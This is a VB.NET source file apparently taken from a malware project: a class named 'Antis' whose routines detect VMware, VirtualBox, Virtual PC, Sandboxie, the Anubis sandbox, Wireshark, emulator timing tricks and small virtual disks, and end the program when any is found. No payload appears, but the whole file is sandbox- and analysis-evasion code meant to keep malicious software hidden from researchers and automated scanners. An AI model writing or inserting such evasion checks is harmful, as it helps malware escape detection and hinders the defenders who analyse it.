Imports System.Threading
Imports System.Environment

Public Class Antis
    Public Sub startanti()
        AntiVMware()
        VirtualBox()
        antiAnubis()
        HardDriveSize()
        AntiEmulator()
        antiSandboxie()
        antiVpc()
        AntiWireshark()


    End Sub
#Region "Anti Functions (X8)"
    Private Declare Function GetDiskFreeSpaceEx Lib "kernel32" Alias "GetDiskFreeSpaceExA" _
       (ByVal lpDirectoryName As String, ByRef lpFreeBytesAvailableToMe As Long, _
       ByRef lpTotalNumberOfBytes As Long, ByRef lpTotalNumberOfFreeBytes As Long) As Integer

    Public Function AntiEmulator() As Boolean
        Dim timenow As Long
        Dim timeaftersleep As Long
        timenow = TickCount
        Thread.Sleep(500)
        timeaftersleep = TickCount
        If timeaftersleep - timenow < 500 Then
            End
     
        End If
    End Function
    Public Function AntiWireshark()
        Dim ProcessList As System.Diagnostics.Process()
        ProcessList = System.Diagnostics.Process.GetProcesses()
        Dim Proc As System.Diagnostics.Process
        For Each Proc In ProcessList
            If Proc.MainWindowTitle.Contains("Wireshark") = True Then
                End
            End If
        Next
    End Function
    Public Function antiSandboxie() As Boolean
        If Process.GetProcessesByName("SbieSvc").Length >= 1 Then
               End
       
        End If
    End Function
    Public Function antiVpc() As Boolean
        If Process.GetProcessesByName(("vpcmap")).Length >= 4 And Process.GetProcessesByName(("vmsrvc")).Length >= 4 Then
            End
        End If
    End Function
    Public Function AntiVMware() As Boolean
        If Process.GetProcessesByName("vmwareservice").Length >= 1 Then
            End
       
        End If
    End Function
    Public Function VirtualBox() As Boolean
        If Process.GetProcessesByName("VBoxservice").Length >= 1 Then
           End
        End If
    End Function
    Private Function antiAnubis() As Boolean
        Dim folder As String = Application.StartupPath
        Dim getFile As String = folder & "\sample.exe"
        If Application.ExecutablePath = getFile Then
             End
        End If
    End Function
    Public Function HardDriveSize() As Boolean
        Dim DriveOrFolder As String = "c:"
        Dim FreeBytesAvailableToMe As Long
        Dim TotalBytes As Long
        Dim FreeBytes As Long
        Dim FetchResult As Integer
        FetchResult = GetDiskFreeSpaceEx(DriveOrFolder, FreeBytesAvailableToMe, TotalBytes, FreeBytes)
        If TotalBytes >= 20000000000 Then

            Return True
        Else : End
        End If
    End Function
#End Region

End Class
